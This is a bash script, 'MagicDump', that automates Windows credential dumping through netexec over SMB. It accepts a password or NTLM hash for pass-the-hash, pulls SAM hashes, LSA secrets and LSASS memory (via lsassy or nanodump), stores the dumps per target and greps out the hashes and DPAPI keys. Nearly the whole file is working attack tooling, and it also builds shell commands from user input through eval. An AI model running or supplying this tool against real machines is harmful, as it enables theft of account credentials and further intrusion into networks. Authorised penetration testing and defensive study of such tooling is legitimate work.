#!/usr/bin/env bash

# Define directories
BASE_DIR="$HOME/.magicdump"
LOG_DIR="$BASE_DIR/logs"
DUMP_DIR="$BASE_DIR/dumps"

# Function to ensure a directory exists
ensure_dir_exists() {
  local dir="$1"
  if [[ ! -d "$dir" ]]; then
    mkdir -p "$dir" || {
      echo -e "${RED}[ERROR]${RESET} Failed to create directory: $dir. Check permissions."
      exit 1
    }
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Created directory: $dir"
  else
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Directory already exists: $dir"
  fi
}

# Ensure all necessary directories exist
ensure_dir_exists "$BASE_DIR"
ensure_dir_exists "$LOG_DIR"
ensure_dir_exists "$DUMP_DIR"

# Colors
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Dynamic banner
echo -e "${BLUE}==============================${RESET}"
echo -e "${GREEN}       MagicDump v1.0       ${RESET}"
echo -e "${BLUE}==============================${RESET}"

# Check for required tools
if ! command -v nxc &>/dev/null; then
  echo -e "${RED}[ERROR]${RESET} netexec (nxc) is not installed or not in the PATH."
  exit 1
fi
if ! command -v jq &>/dev/null; then
  echo -e "${RED}[ERROR]${RESET} jq is not installed or not in the PATH."
  exit 1
fi

# Trap to clean up temporary files on exit
trap "rm -f tmp.$$.json" EXIT

# Usage function for help
usage() {
  echo "MagicDump - Automated Windows Credential Dumping Tool"
  echo ""
  echo "Usage: $0 -t <target_ip> -u <username> [-p <password> | -H <hash>] [--local-auth] [-v|--verbose]"
  echo ""
  echo "Options:"
  echo "  -t, --target     Target IP address of the Windows machine"
  echo "  -u, --username   Username for authentication"
  echo "  -p, --password   Password for authentication"
  echo "  -H, --hash       NTLM hash for Pass-the-Hash authentication"
  echo "      --local-auth Use local authentication"
  echo "  -v, --verbose    Enable verbose output for debugging"
  echo "  -h, --help       Show this help message and exit"
  echo ""
  exit 0
}

# Parse arguments
TARGET_HOST=""
USERNAME=""
PASSWORD=""
HASH=""
VERBOSE=0
LOCAL_AUTH=0  # Default: Do not use local authentication

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)
      TARGET_HOST="$2"
      shift 2
      ;;
    -u|--username)
      USERNAME="$2"
      shift 2
      ;;
    -p|--password)
      PASSWORD="$2"
      shift 2
      ;;
    -H|--hash)
      HASH="$2"
      shift 2
      ;;
    --local-auth)
      LOCAL_AUTH=1
      shift
      ;;
    -v|--verbose)
      VERBOSE=1
      shift
      ;;
    -h|--help)
      usage
      ;;
    *)
      echo -e "${RED}[ERROR]${RESET} Unknown argument: $1"
      usage
      ;;
  esac
done

# Check for required arguments
if [[ -z "$TARGET_HOST" || -z "$USERNAME" || ( -z "$PASSWORD" && -z "$HASH" ) ]]; then
  echo -e "${RED}[ERROR]${RESET} Missing required arguments!"
  usage
fi

if [[ -n "$PASSWORD" && -n "$HASH" ]]; then
  echo -e "${RED}[ERROR]${RESET} Specify either a password (-p) or a hash (-H), but not both!"
  usage
fi

# Verbose mode
[[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Verbose mode enabled"
[[ $LOCAL_AUTH -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Local authentication enabled (--local-auth)"

# Target-specific directories
TARGET_DUMP_DIR="$DUMP_DIR/$TARGET_HOST"
TARGET_LOG_DIR="$LOG_DIR/$TARGET_HOST"
ensure_dir_exists "$TARGET_DUMP_DIR"
ensure_dir_exists "$TARGET_LOG_DIR"

# Define log file
LOG_FILE="$TARGET_LOG_DIR/report_${TARGET_HOST}_$(date +%Y%m%d%H%M%S).json"

# Initialize JSON log
cat <<EOF > "$LOG_FILE"
{
  "target_host": "$TARGET_HOST",
  "operation_time": "$(date --utc +"%Y-%m-%dT%H:%M:%SZ")",
  "credentials_dumped": {},
  "warnings": [],
  "logs": []
}
EOF

# Function to log an operation
log_operation() {
  local category="$1"
  local status="$2"
  local details="$3"
  jq ".credentials_dumped.\"$category\" = {\"status\": \"$status\", $details}" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${BLUE}[LOG]${RESET} Operation: $category, Status: $status"
}

# Function to add a log entry
add_log() {
  local message="$1"
  jq ".logs += [\"$message\"]" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${GREEN}[INFO]${RESET} $message"
}

# Function to add a warning
add_warning() {
  local warning="$1"
  jq ".warnings += [\"$warning\"]" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${YELLOW}[WARNING]${RESET} $warning"
}

# Function to run a command and log it
run_command() {
  local cmd="$1"
  [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Running command: $cmd"
  eval "$cmd"
}

# Function to construct the base command
construct_base_cmd() {
  local base_cmd="nxc smb $TARGET_HOST -u $USERNAME"
  if [[ -n "$PASSWORD" ]]; then
    base_cmd+=" -p '$PASSWORD'"
  elif [[ -n "$HASH" ]]; then
    base_cmd+=" -H '$HASH'"
  fi
  [[ $LOCAL_AUTH -eq 1 ]] && base_cmd+=" --local-auth"
  echo "$base_cmd"
}

# Parsing Functions
parse_sam_output() {
  local output_file="$1"
  echo -e "${GREEN}[SAM HASHES FOUND]:${RESET}"
  grep -oP "^[^:]+:[0-9]+:[^:]+:[^:]+:::" "$output_file" || echo -e "${YELLOW}No SAM hashes found.${RESET}"
}

parse_lsa_output() {
  local output_file="$1"
  echo -e "${GREEN}[LSA SECRETS FOUND]:${RESET}"

  # Use awk to extract relevant LSA secrets
  awk '
    /Dumping LSA secrets/ {secrets = 1; next}
    secrets && /SMB.*:/ {
      print "  " $0
    }
    secrets && /dpapi_[a-z]+key:/ {
      print "  " $0
    }
    secrets && /NL\$KM:/ {
      print "  " $0
    }
    secrets && !/SMB|dpapi|NL\$KM/ {exit}
  ' "$output_file" | while read -r line; do
    echo -e "${line}"
  done || echo -e "${YELLOW}No LSA secrets found.${RESET}"
}

parse_lsass_output() {
  local output_file="$1"
  echo -e "${GREEN}[LSASS CREDENTIALS FOUND]:${RESET}"
  grep -oP "[^ ]+\\\\[^ ]+ [0-9a-f]{32}" "$output_file" || echo -e "${YELLOW}No LSASS credentials found.${RESET}"
}

# Dump Functions
dump_sam() {
  local output_file="$TARGET_DUMP_DIR/SAM_dump_${TARGET_HOST}.txt"
  local cmd
  cmd=$(construct_base_cmd)" --sam > '$output_file' 2>&1"

  add_log "Starting SAM dump using netexec..."
  if run_command "$cmd"; then
    log_operation "SAM" "success" "\"file_path\": \"$output_file\""
    add_log "SAM dump saved to $output_file"
    parse_sam_output "$output_file"
  else
    log_operation "SAM" "failed" "\"error\": \"Failed to dump SAM\""
    add_warning "Failed to dump SAM on target $TARGET_HOST"
  fi
}

dump_lsa() {
  local output_file="$TARGET_DUMP_DIR/LSA_dump_${TARGET_HOST}.txt"
  local cmd
  cmd=$(construct_base_cmd)" --lsa > '$output_file' 2>&1"

  add_log "Starting LSA dump using netexec..."
  if run_command "$cmd"; then
    log_operation "LSA" "success" "\"file_path\": \"$output_file\""
    add_log "LSA dump saved to $output_file"
    parse_lsa_output "$output_file"
  else
    log_operation "LSA" "failed" "\"error\": \"Failed to dump LSA\""
    add_warning "Failed to dump LSA on target $TARGET_HOST"
  fi
}

dump_lsass() {
  local method="${1:-lsassy}"
  local output_file="$TARGET_DUMP_DIR/LSASS_dump_${TARGET_HOST}.txt"
  local cmd
  cmd=$(construct_base_cmd)

  case "$method" in
    nanodump) cmd+=" -M nanodump" ;;
    lsassy) cmd+=" -M lsassy" ;;
    *) echo -e "${RED}[ERROR] Invalid method for LSASS dump.${RESET}"; return 1 ;;
  esac

  add_log "Starting LSASS dump using $method..."
  if run_command "$cmd > '$output_file' 2>&1"; then
    log_operation "LSASS" "success" "\"file_path\": \"$output_file\", \"method\": \"$method\""
    add_log "LSASS dump saved to $output_file"
    parse_lsass_output "$output_file"
  else
    log_operation "LSASS" "failed" "\"error\": \"Failed to dump LSASS\""
    add_warning "Failed to dump LSASS on target $TARGET_HOST"
  fi
}

# Main Logic
add_log "Starting MagicDump against target $TARGET_HOST"
add_log "Authenticating as user '$USERNAME'..."
dump_sam
dump_lsa
dump_lsass
echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
